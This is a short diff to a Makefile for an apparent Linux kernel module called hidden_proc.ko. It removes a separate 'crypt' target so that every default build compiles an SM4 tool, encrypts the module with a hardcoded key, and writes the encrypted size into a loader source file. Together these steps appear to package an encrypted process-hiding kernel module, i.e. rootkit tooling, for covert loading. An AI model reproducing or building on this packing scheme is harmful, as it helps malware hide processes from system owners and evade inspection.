@@ -7,8 +7,6 @@ else
 	PWD := $(shell pwd)
 default:
 	$(MAKE)  -C $(KERNELDIR) M=$(PWD) modules
-
-crypt:
 	gcc -O2 -o sm4tool sm4.c sm4tool.c
 	./sm4tool 'anquanyanjiu&890' hidden_proc.ko hidden_proc.ko.tmp
 	sed -i "s/int m_size = .*;/int m_size = `stat -c %s hidden_proc.ko.tmp`;/" load.c 
